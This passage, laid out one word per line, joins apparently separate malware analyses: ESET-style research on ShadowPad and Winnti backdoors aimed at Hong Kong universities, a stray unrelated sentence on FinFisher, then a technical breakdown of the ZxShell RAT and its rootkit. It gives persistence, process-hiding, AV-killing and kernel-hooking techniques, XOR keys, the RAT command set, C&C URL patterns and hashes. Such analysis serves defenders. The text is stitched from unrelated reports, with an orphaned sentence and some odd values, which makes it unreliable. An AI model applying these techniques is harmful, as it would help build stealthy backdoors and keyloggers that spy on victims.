main
function
of
hpqhvind.exe
.
 
The
patched
code
is
located
right
after
the
load
of
hpqhvsei.dll
.
 
This
means
that
the
function
responsible
for
decrypting
and
executing
the
payload
is
executed
directly
after
the
load
of
the
malicious
DLL
.
 
The
encrypted
payload
is
located
in
the
.rdata
section
of
hpqhvsei.dll
and
the
decryption
algorithm
is
an
XOR
loop
where
the
XOR
key
is
updated
at
each
iteration
.
 
The
decrypted
payload
is
the
usual
shellcode
responsible
for
ShadowPad
initialization
(
obfuscated
using
fake
conditional
jumps
to
hinder
disassembly
)
.
 
After
having
been
decrypted
,
ShadowPad
s
shellcode
is
executed
.
 
It
will
first
achieve
persistence
on
the
system
by
writing
the
in-memory
patched
parent
process
to
disk
to
a
path
specified
in
the
configuration
string
pool
.
 
In
the
case
we
examined
,
the
path
was
C:\ProgramData\DRM\CLR\CLR.exe
.
 
It
then
creates
a
service
named
clr_optimization_v4.0.30229_32
,
which
is
responsible
for
executing
CLR.exe
.
 
To
avoid
suspicion
,
this
service
name
,
as
well
as
the
executable
name
,
were
chosen
to
look
similar
to
the
name
of
a
Microsoft
.NET
optimization
Service
.
 
The
numbering
on
each
arrow
corresponds
to
the
chronological
sequence
of
events
.
 
ShadowPad
is
a
multimodular
backdoor
where
the
modules
are
referenced
from
the
Root
module
with
a
circular
list
from
which
one
can
extract
the
module
address
,
a
UNIX
timestamp
(
probably
embedded
automatically
during
the
module
s
compilation
process
)
and
a
module
identifier
.
 
From
the
module
itself
we
can
also
extract
the
name
the
developer
gave
to
the
module
.
 
This
version
embeds
the
17
modules
listed
in
the
following
table
:
100
Root
Thu
24
Oct
2019
12:08:27
PM
UTC
Initial
shellcode
.
 
101
Plugins
Thu
24
Oct
2019
12:07:02
PM
UTC
Provides
API
for
the
other
modules
;
loads
modules
.
 
102
Config
Thu
24
Oct
2019
12:07:09
PM
UTC
Handles
encrypted
configuration
string
pool
.
 
103
Install
Thu
24
Oct
2019
12:07:46
PM
UTC
Achieves
persistence
.
 
104
Online
Thu
24
Oct
2019
12:07:17
PM
UTC
Overall
communications
with
the
C&C
server
.
 
106
ImpUser
Thu
24
Oct
2019
12:07:24
PM
UTC
User
impersonation
via
token
duplication
.
 
200
TCP
Thu
24
Oct
2019
12:01:01
PM
UTC
TCP
communications
.
 
202
HTTPS
Thu
24
Oct
2019
12:01:15
PM
UTC
HTTPS
communications
.
 
207
Pipe
Thu
24
Oct
2019
12:01:35
PM
UTC
Handles
named
pipes
.
 
300
Disk
Thu
24
Oct
2019
12:02:29
PM
UTC
File
system
operations
.
 
301
Process
Thu
24
Oct
2019
12:02:36
PM
UTC
Process
handling
.
 
302
Servcie
Thu
24
Oct
2019
12:02:45
PM
UTC
Service
handling
.
 
303
Register
Thu
24
Oct
2019
12:02:52
PM
UTC
Registry
operations
.
 
304
Shell
Thu
24
Oct
2019
12:03:00
PM
UTC
Command
line
operations
.
 
306
Keylogger
Thu
24
Oct
2019
12:03:16
PM
UTC
Keylogging
to
file
system
.
 
307
Screen
Thu
24
Oct
2019
12:03:25
PM
UTC
Screenshot
capture
.
 
317
RecentFiles
Thu
24
Oct
2019
12:04:44
PM
UTC
Lists
recently
accessed
files
.
 
These
modules
,
except
for
RecentFiles
,
have
already
been
mentioned
by
Kaspersky
and
Avast
.
 
Notice
the
Servcie
typo
.
 
As
usual
,
all
the
module
timestamps
are
spread
over
a
short
time
range
,
which
could
suggest
the
use
of
a
build
framework
to
compile
these
modules
.
 
This
also
suggests
that
these
modules
were
built
a
few
hours
before
the
launcher
itself
,
whose
compilation
timestamp
is
Thu
Oct
24
14:10:32
2019
.
 
Since
this
compilation
timestamp
dates
back
two
weeks
before
this
campaign
,
it
s
likely
that
it
has
nt
been
tampered
with
by
the
attackers
.
 
One
might
also
note
that
the
number
of
modules
embedded
in
this
variant
is
much
higher
(
17
)
than
the
number
of
modules
embedded
in
the
variants
previously
documented
in
our
white
paper
(
8
to
10
modules
)
.
 
By
default
,
every
keystroke
is
recorded
using
the
Keylogger
module
(
306,
previously
documented
by
Avast
)
and
saved
to
disk
in
the
file
%APPDATA%\PAGM\OEY\XWWEYG\WAOUE
.
 
The
log
file
is
encrypted
using
the
same
algorithm
as
the
one
used
to
encrypt
static
strings
from
the
module
.
 
Using
this
module
by
default
indicates
that
the
attackers
are
interested
in
stealing
information
from
the
victims
machines
.
 
In
contrast
,
the
variants
we
described
in
our
white
paper
did
nt
even
have
that
module
embedded
.
 
As
with
previous
ShadowPad
variants
,
the
Config
module
(
102
)
contains
an
encrypted
string
pool
that
can
be
accessed
from
any
other
module
.
 
The
string
pool
is
never
stored
entirely
decrypted
in
memory
;
the
field
of
interest
is
decrypted
when
needed
and
then
immediately
freed
(
thus
quickly
unavailable
)
.
 
The
configuration
size
is
2180
bytes
and
the
encrypted
strings
are
located
at
offset
0x84
.
 
The
algorithm
used
to
decrypt
the
strings
is
the
same
as
the
one
used
to
decrypt
the
static
strings
of
the
module
.
 
The
campaign
ID
is
located
at
offset
0x99
and
is
the
name
of
the
targeted
university
.
 
Having
a
campaign
ID
related
to
the
target
is
quite
common
in
the
case
of
ShadowPad
and
Winnti
.
 
Interestingly
,
the
timestamp
present
in
this
config
at
offset
0x84
is
later
than
the
modules
timestamps
and
the
loader
compilation
timestamp
.
 
This
suggests
that
this
config
is
added
manually
to
the
sample
after
having
been
built
.
 
Even
though
it
s
probably
coincidental
,
the
date
within
the
config
corresponds
to
the
date
of
the
first
detection
of
this
sample
at
the
corresponding
university
.
 
Once
installed
on
the
system
,
ShadowPad
starts
a
hidden
and
suspended
Microsoft
Windows
Media
Player
wmplayer.exe
process
and
injects
itself
into
that
process
.
 
The
path
to
wmplayer.exe
is
provided
by
the
Config
module
.
 
Once
ShadowPad
is
injected
into
wmplayer.exe
,
the
Online
module
will
contact
the
C&C
server
using
the
URL
specified
in
the
configuration
.
 
The
communication
is
then
handled
by
the
TCP
module
(
200
)
,
which
was
previously
documented
by
Kaspersky
.
 
In
addition
to
ShadowPad
,
the
Winnti
malware
was
found
on
some
machines
at
these
two
universities
at
the
end
of
October
(
i.e
.
 
two
weeks
before
ShadowPad
)
in
the
file
C:\Windows\System32\oci.dll
and
is
detected
by
ESET
products
as
Win64/Winnti.CA
.
 
The
Winnti
malware
usually
contains
a
configuration
specifying
a
campaign
ID
and
a
C&C
URL
.
 
On
all
machines
the
campaign
ID
matches
the
name
of
the
targeted
university
and
the
C&C
URLs
are
:
w[redacted].livehost.live
:
443
.
 
w[redacted].dnslookup.services
:
443
.
 
where
the
redacted
part
corresponds
to
the
name
of
the
targeted
university
.
 
One
can
observe
that
the
C&C
URL
used
by
both
Winnti
and
ShadowPad
complies
to
the
scheme
[backdoor_type][target_name].domain.tld
:
443
where
[backdoor_type]
is
a
single
letter
which
is
either
w
in
the
case
of
the
Winnti
malware
or
b
in
the
case
of
ShadowPad
.
 
From
this
format
,
we
were
able
to
find
several
C&C
URLs
,
including
three
additional
Hong
Kong
universities
names
.
 
The
campaign
identifiers
found
in
the
samples
we
ve
analyzed
match
the
subdomain
part
of
the
C&C
server
,
showing
that
these
samples
were
really
targeted
against
these
universities
.
 
The
Winnti
Group
is
still
actively
using
one
of
its
flagship
backdoors
,
ShadowPad
,
this
time
against
Hong
Kong
universities
.
 
In
this
campaign
,
the
VMProtected
launcher
used
with
ShadowPad
,
as
well
as
with
the
PortReuse
backdoor
and
skip-2.0
,
was
replaced
by
a
simpler
one
.
 
That
these
samples
,
in
addition
to
having
been
found
at
these
universities
,
contain
campaign
IDs
matching
the
universities
names
and
use
C&C
URLs
containing
the
universities
names
are
good
indications
that
this
campaign
is
highly
targeted
.
 
We
will
continue
to
monitor
new
activities
of
the
Winnti
Group
and
will
publish
relevant
information
on
our
blog
.
 
For
any
inquiries
,
contact
us
at
threatintel@eset.com
.
 
The
IoCs
are
also
available
in
our
GitHub
repository
.
 
ESET
detection
names
:
Win32
/
Shadowpad.C
trojan
Win64
/
Winnti.CA
trojan
.
 
Winnti
:
hpqhvsei.dll
.
 
Winnti
:
CLR.exe
.
 
Winnti
:
hpqhvsei.dll
.
 
Winnti
:
hpqhvind.exe
.
 
Winnti
:
hpqhvsei.dll
.
 
Winnti
:
oci.dll
.
 
Winnti
:
C&C
:
b[org_name].dnslookup.services
:
443
.
 
Winnti
:
C&C
:
w[org_name].livehost.live
:
443
.
 
Winnti
:
C&C
:
w[org_name].dnslookup.services
:
443
.
 
Middle
Eastern
hacking
group
is
using
FinFisher
malware
to
conduct
international
espionage
.
 
Recently
,
there
was
a
blog
post
on
the
takedown
of
a
botnet
used
by
threat
actor
group
known
as
Group
72
and
their
involvement
in
Operation
SMN
.
 
This
group
is
sophisticated
,
well
funded
,
and
exclusively
targets
high
profile
organizations
with
high
value
intellectual
property
in
the
manufacturing
,
industrial
,
aerospace
,
defense
,
and
media
sector
.
 
The
primary
attack
vectors
are
watering-hole
,
spear
phishing
,
and
other
web-based
attacks
.
 
Frequently
,
a
remote
administration
tool
(
RAT
)
is
used
to
maintain
persistence
within
a
victim
s
organization
.
 
These
tools
are
used
to
further
compromise
the
organization
by
attacking
other
hosts
inside
the
targets
network
.
 
ZxShell
(
aka
Sensocode
)
is
a
Remote
Administration
Tool
(
RAT
)
used
by
Group
72
to
conduct
cyber-espionage
operations
.
 
Once
the
RAT
is
installed
on
the
host
it
will
be
used
to
administer
the
client
,
exfiltrate
data
,
or
leverage
the
client
as
a
pivot
to
attack
an
organization
s
internal
infrastructure
.
 
Here
is
a
short
list
of
the
types
of
tools
included
with
ZxShell
:
Keylogger
(
used
to
capture
passwords
and
other
interesting
data
)
.
 
Command
line
shell
for
remote
administration
.
 
Remote
desktop
.
 
Various
network
attack
tools
used
to
fingerprint
and
compromise
other
hosts
on
the
network
.
 
Local
user
account
creation
tools
.
 
For
a
complete
list
of
tools
please
see
the
MainConnectionIo
section
.
 
The
following
paper
is
a
technical
analysis
on
the
functionality
of
ZxShell
.
 
The
analysts
involved
were
able
to
identify
command
and
control
(
C2
)
servers
,
dropper
and
installation
methods
,
means
of
persistence
,
and
identify
the
attack
tools
that
are
core
to
the
RAT
s
purpose
.
 
In
addition
,
the
researchers
used
their
analysis
to
provide
detection
coverage
for
Snort
,
Fireamp
,
and
ClamAV
.
 
ZxShell
has
been
around
since
2004
.
 
There
are
a
lot
of
versions
available
in
the
underground
market
.
 
We
have
analyzed
the
most
common
version
of
ZxShell
,
version
3.10
.
 
There
are
newer
versions
,
up
to
version
3.39
as
of
October
2014
.
 
An
individual
who
goes
by
the
name
LZX
in
some
online
forums
is
believed
to
be
the
original
author
of
ZxShell
.
 
Since
ZxShell
has
been
around
since
at
least
2004
,
numerous
people
have
purchased
or
obtained
the
tools
necessary
to
set
up
ZxShell
command
and
control
servers
(
C&C
)
and
generate
the
malware
that
is
placed
on
the
victim
s
network
.
 
ZxShell
has
been
observed
to
be
distributed
through
phishing
attacks
,
dropped
by
exploits
that
leverage
vulnerabilities
such
as
CVE-2011-2462
,
CVE-2013-3163
,
and
CVE-2014-0322
.
 
To
illustrate
the
functionality
of
main
ZxShell
module
,
Let
s
take
a
look
at
the
following
sample
:
MD5
:
e3878d541d17b156b7ca447eeb49d96a
.
 
SHA256
:
1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c
.
 
It
exports
the
following
functions
,
which
are
examined
in
greater
detail
below
:
DllMain
Install
UnInstall
ServiceMain
ShellMain
ShellMainThread
zxFunction001
zxFunction002
.
 
DllMain
performs
the
initialization
of
ZxShell
.
 
It
allocates
a
buffer
of
0x2800
bytes
and
copies
the
code
for
the
ZxGetLibAndProcAddr
function
.
 
To
copy
memory
,
the
memcpy
function
is
invoked
.
 
It
is
not
directly
used
from
msvcrt.dll
but
is
instead
copied
to
another
memory
chunk
before
being
called
.
 
Finally
,
the
trojan
Import
Address
Table
(
IAT
)
is
resolved
and
the
file
path
of
the
process
that
hosts
the
DLL
is
resolved
and
saved
in
a
global
variable
.
 
ZxShell.dll
is
injected
in
a
shared
SVCHOST
process
.
 
The
Svchost
group
registry
key
HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\SvcHost
is
opened
and
the
netsvc
group
value
data
is
queried
to
generate
a
name
for
the
service
.
 
Before
the
malware
can
be
installed
a
unique
name
must
to
be
generated
for
the
service
.
 
The
malware
accomplishes
this
through
querying
the
netsvc
group
value
data
located
in
the
svchost
group
registry
key
which
is
HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\SvcHost
.
 
At
startup
,
Svchost.exe
checks
the
services
part
of
the
registry
and
constructs
a
list
of
services
to
load
.
 
Each
Svchost
session
can
contain
multiple
shared
services
that
are
organized
in
groups
.
 
Therefore
,
separate
services
can
run
,
depending
on
how
and
where
Svchost.exe
is
started
.
 
Svchost.exe
groups
are
identified
in
the
above
registry
key
.
 
Each
value
under
this
key
represents
a
separate
Svchost
group
and
appears
as
a
separate
instance
when
you
are
viewing
active
processes
.
 
Each
value
is
a
REG_MULTI_SZ
value
and
contains
the
services
that
run
under
that
Svchost
group
.
 
Each
Svchost
group
can
contain
one
or
more
service
names
that
are
extracted
from
the
following
registry
key
,
whose
Parameters
key
contains
a
ServiceDLL
value
:
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Service
.
 
On
a
Windows
machine
,
the
netsvc
group
contains
names
of
both
existing
and
non-existing
services
.
 
ZxShell
exploits
this
fact
by
cycling
between
each
of
the
names
,
verifying
the
existence
of
the
real
service
.
 
The
service
s
existence
is
verified
with
the
ServiceExists
function
,
which
attempts
to
open
the
relative
registry
sub-key
in
HKLM\SYSTEM\CurrentControlSet\Services
.
 
The
first
service
name
that
is
not
installed
on
the
system
becomes
the
ZxShell
service
name
.
 
A
new
service
is
then
created
using
the
service
parser
function
ProcessScCommand
.
 
ZxShell
implemented
its
own
version
of
the
Windows
SC
command
.
 
There
are
minor
differences
between
the
ZxShell
implementation
of
this
command
and
the
original
Windows
one
.
 
The
installed
service
registry
key
is
opened
and
the
2
values
under
its
Parameter
subkey
are
created
.
 
These
2
values
,
ServiceDll
and
ServiceDllUnloadOnStop
are
needed
for
services
that
run
in
a
shared
process
.
 
Before
the
service
is
started
ChangeServiceConfig
is
called
to
modify
the
service
type
to
shared
and
interactive
.
 
If
the
service
fails
to
start
then
a
random
service
name
formatted
as
netsvc_xxxxxxxx
,
where
xxxxxxxx
represent
an
8-digit
random
hex
value
,
is
added
to
the
netsvc
group
and
the
entire
function
is
repeated
.
 
This
function
is
the
entry
point
of
the
service
.
 
It
registers
the
service
using
the
RegisterServiceCtrlHandler
Windows
API
function
.
 
The
ZxShell
service
handler
routine
is
only
a
stub
:
it
responds
to
each
service
request
code
,
doing
nothing
,
and
finally
exits
.
 
It
sets
the
service
status
to
RUNNING
and
finally
calls
the
ShellMain
function
of
ZxShell
.
 
The
ShellMain
function
is
a
stub
that
relocates
the
DLL
to
another
buffer
and
spawns
a
thread
that
starts
from
ShellMainThreadInt
at
offset
+0xC0CD
.
 
The
ShellMainThreadInt
function
gets
the
HeapDestroy
Windows
API
address
and
replaces
the
first
3
bytes
with
the
RET
4
opcode
.
 
Subsequently
,
it
calls
the
FreeLibrary
function
to
free
its
own
DLL
buffer
located
at
its
original
address
.
 
Because
of
this
,
the
allocated
heaps
will
not
be
freed
.
 
It
re-copies
the
DLL
from
the
new
buffer
to
the
original
one
using
the
memcpy
function
.
 
Finally
,
it
spawns
the
main
thread
that
starts
at
the
original
location
of
ShellMainThread
procedure
,
and
terminates
.
 
At
this
point
,
the
ZxShell
library
is
no
longer
linked
in
the
module
list
of
the
host
process
.
 
This
is
important
because
if
any
system
tool
tries
to
open
the
host
process
it
will
never
display
the
ZxShell
DLL
.
 
This
thread
implements
the
main
code
,
responsible
for
the
entire
botnet
DLL
.
 
First
,
it
checks
if
the
DLL
is
executed
as
a
service
.
 
If
so
,
it
spawns
the
service
watchdog
thread
.
 
The
watchdog
thread
checks
the
registry
path
of
the
ZxShell
service
every
2
seconds
,
to
verify
that
it
has
nt
been
modified
.
 
If
a
user
or
an
application
modifies
the
ZxShell
service
registry
key
,
the
code
restores
the
original
infected
service
key
and
values
.
 
The
buffer
containing
the
ZxShell
Dll
in
the
new
location
is
freed
using
the
VirtualFree
API
function
.
 
A
handle
to
the
DLL
file
is
taken
in
order
to
make
its
deletion
more
difficult
.
 
The
ZxShell
mutex
is
created
named
@_ZXSHELL_@
.
 
ZxShell
plugins
are
parsed
and
loaded
with
the
AnalyseAndLoadPlugins
function
.
 
The
plugin
registry
key
HKLM\SYSTEM\CurrentControlSet\Control\zxplug
is
opened
and
each
value
is
queried
.
 
The
registry
value
contains
the
plugin
file
name
.
 
The
target
file
is
loaded
using
the
LoadLibrary
API
function
,
and
the
address
of
the
exported
function
zxMain
is
obtained
with
GetProcAddress
.
 
If
the
target
filename
is
incorrect
or
invalid
the
plugin
file
is
deleted
and
the
registry
value
is
erased
.
 
That
is
performed
by
the
function
DeleteAndLogPlugin
.
 
Otherwise
,
the
plugin
is
added
to
an
internal
list
.
 
The
thread
KeyloggerThread
is
spawned
and
is
responsible
for
doing
keylogging
on
the
target
workstation
.
 
We
will
take
a
look
at
the
keylogger
later
on
.
 
Finally
the
main
network
communication
function
GetIpListAndConnect
is
called
.
 
This
function
is
at
the
core
of
the
RAT
s
network
communication
.
 
It
starts
by
initializing
a
random
number
generator
and
reading
100
bytes
inside
the
ZxShell
Dll
at
a
hardcoded
location
.
 
These
bytes
are
XOR
encrypted
with
the
byte-key
0x85
and
contains
a
list
of
remote
hosts
where
to
connect
.
 
The
data
is
decrypted
,
the
remote
host
list
is
parsed
and
verified
using
the
BuildTargetIpListStruct
function
.
 
There
are
3
types
of
lists
recognized
by
ZxShell
:
plain
ip
addresses
,
HTTP
and
FTP
addresses
.
 
If
the
list
does
not
contain
any
item
,
or
if
the
verification
has
failed
,
the
ZxShell
sample
tries
to
connect
to
a
hardcoded
host
with
the
goal
of
retrieving
a
new
updated
list
.
 
Otherwise
,
ZxShell
tries
to
connect
to
the
first
item
of
the
list
.
 
If
ZxShell
successfully
connects
to
the
remote
host
,
the
function
DoHandshake
is
called
.
 
This
function
implements
the
initial
handshake
which
consists
of
exchanging
16
bytes
,
0x00001985
and
0x00000425,
with
the
server
.
 
The
function
GetLocalPcDescrStr
is
used
to
compose
a
large
string
that
contains
system
information
of
the
target
workstation
.
 
The
string
is
sent
to
the
remote
host
and
the
response
is
checked
to
see
if
the
first
byte
of
the
response
is
0xF4,
an
arbitrary
byte
.
 
If
it
is
,
the
botnet
connection
I/O
procedure
is
called
through
the
MainConnectionIo
function
.
 
Otherwise
,
the
ZxShell
code
closes
the
socket
used
and
sleeps
for
30
seconds
.
 
It
will
then
retry
the
connection
with
the
next
remote
host
,
if
there
is
one
.
 
It
is
noteworthy
that
this
function
includes
the
code
to
set
the
ZxShell
node
as
a
server
:
if
one
of
the
hardcoded
boolean
value
is
set
to
1,
a
listening
socket
is
created
.
 
The
code
waits
for
an
incoming
connection
.
 
When
the
connection
is
established
a
new
thread
is
spawned
that
starts
with
the
MainConnectionIo
function
.
 
The
MainConnectionIo
function
checks
if
the
Windows
Firewall
is
enabled
,
sets
the
Tcp
Keep
Alive
value
and
Non-blocking
mode
connection
options
and
receives
data
from
the
remote
host
through
the
ReceiveCommandData
function
.
 
Then
the
connection
is
retried
.
 
The
received
command
is
then
processed
by
the
ZxShell
function
with
the
ProcessCommand
function
.
 
The
command
processing
function
starts
by
substituting
the
main
module
name
and
path
in
the
hosting
process
PEB
,
with
the
one
of
the
default
internet
browser
.
 
This
trick
renders
identification
by
firewall
more
cumbersome
.
 
A
host
firewall
will
recognize
the
outgoing
connection
as
originated
by
the
browser
instead
of
the
ZxShell
service
host
process
.
 
The
browser
process
always
performs
outgoing
connections
and
the
firewall
should
nt
block
them
.
 
The
command
processing
is
straightforward
.
 
Here
is
the
list
of
common
commands
:
Help
/
?
Get
help
.
 
Exit
/
Quit
Exit
and
shut
down
the
botnet
client
.
 
SysInfo
Get
target
System
information
.
 
SYNFlood
Perform
a
SYN
attack
on
a
host
.
 
Ps
Process
service
Unix
command
implementation
.
 
CleanEvent
Clear
System
Event
log
.
 
FindPass
Find
login
account
password
.
 
FileTime
Get
time
information
about
a
file
.
 
FindDialPass
List
all
the
dial-up
accounts
and
passwords
.
 
User
Account
Management
System
.
 
TransFile
Transfer
file
in
or
from
remote
host
.
 
Execute
Run
a
program
in
the
remote
host
.
 
SC
Service
control
command
,
implemented
as
the
Windows
one
.
 
CA
Clone
user
account
.
 
RunAs
Create
new
process
as
another
User
or
Process
context
.
 
TermSvc
Terminal
service
configuration
(
working
on
Win
Xp/2003
)
.
 
GetCMD
Remote
Shell
.
 
Shutdown
Logout
,
shutdown
or
restart
the
target
system
.
 
ZXARPS
Spoofing
,
redirection
,
packet
capture
.
 
ZXNC
Run
ZXNC
v1.1
a
simple
telnet
client
.
 
ZXHttpProxy
Run
a
HTTP
proxy
server
on
the
workstation
.
 
ZXSockProxy
Run
a
Sock
4
&
5
Proxy
server
.
 
ZXHttpServer
Run
a
custom
HTTP
server
.
 
PortScan
Run
TCP
Port
MultiScanner
v1.0
.
 
KeyLog
Capture
or
record
the
remote
computer
s
keystrokes
.
 
The
implementation
is
a
userland
keylogger
that
polls
the
keymap
with
each
keystroke
.
 
LoadDll
Load
a
DLL
into
the
specified
process
.
 
End
Terminate
ZxShell
DLL
.
 
Uninstall
Uninstall
and
terminate
ZxShell
bot
DLL
.
 
ShareShell
Share
a
shell
to
other
.
 
CloseFW
Switch
off
Windows
Firewall
.
 
FileMG
File
Manager
.
 
winvnc
Remote
Desktop
.
 
rPortMap
Port
Forwarding
.
 
capsrv
Video
Device
Spying
.
 
zxplug
Add
and
load
a
ZxShell
custom
plugin
.
 
This
set
of
functionality
allows
the
operator
complete
control
of
a
system
.
 
Being
able
to
transfer
and
execute
files
on
the
infected
system
means
the
attacker
can
run
any
code
they
please
.
 
Further
,
the
keylogging
and
remote
desktop
functionality
allows
the
operator
to
spy
on
the
infected
machine
,
observing
all
keystrokes
and
viewing
all
user
actions
.
 
Unloads
ZxShell
and
deletes
all
of
the
active
components
.
 
This
simply
deletes
the
ZxShell
service
key
from
the
Windows
registry
(
using
SHDeleteKey
Api
)
and
all
of
the
subkeys
.
 
Finally
,
it
marks
ZxShell
main
Dll
for
deletion
with
the
MoveFileEx
Windows
API
.
 
This
function
is
the
supporting
functionality
for
WinVNC
.
 
To
allow
the
VNC
session
to
connect
,
the
current
network
socket
WSAProtcol_Info
structure
is
written
to
a
named
pipe
prior
to
calling
zxFunction001
.
 
zxFunction001
modifies
the
current
process
memory
,
uses
data
contained
in
the
named
pipe
to
create
a
socket
,
and
then
executes
the
code
that
sends
the
remote
desktop
session
to
the
server
controller
.
 
ZxFunction002
This
will
either
bind
the
calling
process
to
a
port
or
has
the
calling
process
connect
to
a
remote
host
.
 
The
functionality
(
connect
or
bind
)
depends
on
the
data
contained
within
the
named
pipe
.
 
Unlike
zxFunction001,
this
is
not
used
by
any
of
the
RAT
commands
in
the
zxshell.dll
.
 
Apart
from
user-mode
ZxShell
droppers
mentioned
earlier
,
there
is
a
file
(
SHA256
:
1e200d0d3de360d9c32e30d4c98f07e100f6260a86a817943a8fb06995c15335
)
that
installs
a
kernel
device
driver
called
loveusd.sys
.
 
The
architecture
of
this
dropper
is
different
from
the
others
:
it
starts
extracting
the
main
driver
from
itself
.
 
It
adds
the
SeLoadDriver
privilege
to
its
access
token
and
proceeds
to
install
the
driver
as
a
fake
disk
filter
driver
.
 
It
then
adds
the
Loveusd.sys
extracted
driver
name
to
the
upper
filter
list
.
 
In
our
analysed
sample
the
Loveusd.sys
driver
is
installed
with
the
name
USBHPMS
.
 
Finally
the
driver
is
started
using
the
ZwLoadDriver
native
API
.
 
The
ZxShell
driver
starts
by
acquiring
some
kernel
information
and
then
hooking
ObReferenceObjectByHandle
API
.
 
Finally
it
spawns
2
system
threads
.
 
The
first
thread
is
the
communication
thread
.
 
ZxShell
employs
a
strange
method
for
communication
:
it
hooks
the
NtWriteFile
API
and
recognizes
5
different
special
handle
values
as
commands
:
0x111111111
:
Hide
Loveusd
driver
from
the
system
kernel
driver
list
.
 
0x22222222
:
Securely
delete
an
in-use
or
no-access
target
file-name
.
 
0x44444444
:
Unhook
the
ZwWriteFile
API
and
hook
KiFastCallEntry
.
 
0x55555555
:
Remove
the
ZxShell
Image
Load
Notify
routine
.
 
0x88888888
:
Set
a
special
value
called
type
in
Windows
registry
key
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverMain
.
 
The
second
Loveusd
system
thread
does
a
lot
of
things
.
 
Its
principal
duties
are
to
create
the
ZxShell
main
DLL
in
c:\Windows\System32\commhlp32.dll
and
to
install
the
Kernel
Load
Image
Notify
routine
.
 
The
code
then
tries
to
kill
each
process
and
service
that
belongs
to
the
following
list
of
AV
products
:
Symantec
Firewall
Norton
ESET
McAfee
Avast
Avira
Sophos
Malwarebytes
.
 
Next
,
the
ZxShell
Load-Image
Notify
function
prevents
the
AV
processes
from
restarting
.
 
The
installation
procedure
continues
in
the
user-mode
dropper
.
 
The
ZxShell
service
is
installed
as
usual
,
and
the
in-execution
dropper
is
deleted
permanently
using
the
special
handle
value
0x22222222
for
the
WriteFile
API
call
.
 
This
handle
value
is
invalid
:
all
the
windows
kernel
handle
values
are
by
design
a
multiple
of
4
.
 
The
ZxShell
hook
code
knows
that
and
intercept
it
.
 
ObReferenceObjectByHandle
is
a
Kernel
routine
designed
to
validate
a
target
object
and
return
the
pointer
to
its
object
body
(
and
even
its
handle
information
)
,
starting
from
the
object
handle
(
even
the
user-mode
one
)
.
 
The
hook
installed
by
ZxShell
implements
one
of
its
filtering
routine
.
 
It
filters
each
attempt
to
open
the
ZxShell
protected
driver
or
the
main
DLL
,
returning
a
reference
to
the
netstat.exe
file
.
 
The
protection
is
enabled
to
all
processes
except
for
ones
in
the
following
list
:
Svchost.exe
,
Lsass.exe
,
Winlogon.exe
,
Services.exe
,
Csrss.exe
,
ctfmon.exe
,
Rundll32.exe
,
mpnotify.exe
,
update.exe
.
 
If
the
type
of
the
object
that
the
system
is
trying
to
validate
is
a
process
,
the
hook
code
rewrites
again
the
configuration
data
of
the
ZxShell
service
in
the
windows
registry
.
 
The
last
type
of
Kernel
modification
that
ZxShell
rootkit
performs
is
the
system
call
dispatcher
(
KiFastCallEntry
)
hook
.
 
In
this
manner
,
ZxShell
is
able
to
completely
hide
itself
,
intercepting
the
following
Kernel
API
calls
:
ZwAllocateVirtualMemory
,
ZwOpenEvent
,
ZwQueryDirectoryFile
,
ZwWriteFile
,
ZwEnumerateKey
,
and
ZwDeviceIoControlFile
.
 
Command
and
Control
Server
:
Sample
(
SHA256
:
1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c
)
is
configured
to
act
as
a
server
.
 
The
symbol
g_bCreateListenSck
is
set
to
1
.
 
This
means
that
,
as
seen
above
,
the
ZxShell
Dll
is
started
in
listening
mode
.
 
It
connects
to
the
first
remote
C&C
that
tries
to
contact
it
and
succeeds
in
the
handshake
.
 
The
encrypted
IP
address
is
127.0.0.2
(
used
as
loopback
)
and
no
connection
is
made
on
that
IP
address
(
due
to
the
listening
variable
set
to
1
)
.
 
We
used
the
ZxShell
package
for
version
3.10
(
SHA256
:
1622460afbc8a255141256cb77af61c670ec21291df8fe0989c37852b59422b4
).The
convenient
thing
about
this
is
that
the
CNC
panel
worked
with
any
version
,
3.10
and
above
.
 
The
buttons
are
all
in
Chinese
,
with
the
help
of
Google
Translate
and
keen
detective
skills
(
read
:
button
clicking
)
,
we
ve
deciphered
the
functionality
.
 
Once
an
infected
machine
connects
,
you
see
its
information
displayed
in
a
selection
box
at
the
top
.
 
There
are
some
built
in
functions
on
the
side
for
the
more
common
features
.
 
These
include
remote
desktop
,
webcam
spying
,
remote
shell
,
and
file
management
.
 
You
can
also
select
a
host
and
type
help
for
a
full
list
of
commands
.
 
I
have
the
same
machine
infected
with
two
different
version
of
ZxShell
.
 
Sending
the
help
command
for
each
,
you
can
see
the
extra
features
added
between
version
3.1
and
3.2
.
 
Keylogging
,
ZXARPS
(
IP
and
URL
spoofing
)
,
and
SYNFlood
are
some
of
the
interesting
features
added
to
version
3.2
.
 
In
versions
3.1
3.21,
the
configuration
info
is
xor
encoded
with
0x85
.
 
This
configuration
info
can
be
changed
with
a
tool
included
in
the
ZxShell
package
.
 
In
versions
3.22
and
3.39
the
routine
changes
.
 
The
new
xor
encoding
byte
is
0x5B
.
 
The
data
is
stored
in
the
last
0x100
bytes
of
the
file
.
 
The
first
8
bytes
of
data
are
static
.
 
Then
there
is
the
dll
install
name
,
the
domain
,
and
the
port
.
 
Knowing
the
obfuscation
routines
for
this
data
we
wrote
a
script
to
extract
the
URLs
/
IPs
and
ports
stored
.
 
The
most
common
ports
used
are
,
80,
1985,
1986,
and
443
.
 
1985
is
the
default
port
for
the
malware
,
1986
is
the
lazy
variation
of
that
port
.
 
Port
80
and
443
are
the
default
ports
for
HTTP
and
HTTPS
traffic
.
 
The
next
most
common
is
port
53
.
 
This
is
used
in
some
of
the
newer
3.22
and
3.39
samples
.
 
After
that
,
the
count
for
each
port
starts
declining
sharply
.
 
The
choices
are
interesting
though
,
many
correspond
to
what
looks
like
the
birth
year
of
the
controller
(
ie
.
 
years
in
the
late
1980s
and
early
1990s
)
,
and
others
seem
to
match
what
year
the
malware
was
launched
in
(
ie
.
 
in
the
2000s
,
relatively
close
to
the
current
year
)
.
 
Since
this
malware
dates
back
to
around
2004
,
there
are
many
samples
containing
CNC
URLs
from
the
3322.org
page
.
 
This
page
used
to
offer
no-ip
type
hosting
and
was
widely
used
by
malware
authors
.
